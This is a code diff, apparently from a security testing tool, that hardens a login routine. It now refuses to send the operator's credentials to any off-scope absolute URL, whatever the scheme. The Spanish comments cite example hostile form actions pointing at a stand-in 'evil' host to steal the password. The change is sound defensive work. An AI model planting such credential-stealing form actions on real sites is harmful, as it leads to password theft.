@@ -181,13 +181,16 @@ export function buildLoginSteps(step, loginUrl, user, password, cookieFile, root
       }
       const postUrl = detectLoginFormAction(html, loginUrl);
       // El action del form de login lo controla el TARGET (HTML propio),
-      // no el operador. Si resuelve a un host distinto del loginUrl
-      // pedido y ese host tampoco está confirmado en `root`, no se
-      // envían las credenciales reales ahí (fail-closed) — de lo
-      // contrario un target hostil con <form action="https://evil/steal">
-      // exfiltra la contraseña del operador.
+      // no el operador. Si resuelve a una URL absoluta CUALQUIERA
+      // (http(s), pero también ftp://, gopher://, etc. — cualquier
+      // esquema con "://" es una URL absoluta, no una ruta same-origin)
+      // apuntando a un host distinto del loginUrl pedido y ese host
+      // tampoco está confirmado en `root`, no se envían las credenciales
+      // reales ahí (fail-closed) — de lo contrario un target hostil con
+      // <form action="ftp://evil/steal"> (o https://) exfiltra la
+      // contraseña del operador.
       if (
-        /^https?:\/\//i.test(postUrl) &&
+        /^[a-z][a-z0-9+.-]*:\/\//i.test(postUrl) &&
         !hostInScope(postUrl, loginUrl) &&
         !(root && hostInScope(postUrl, root))
       ) {
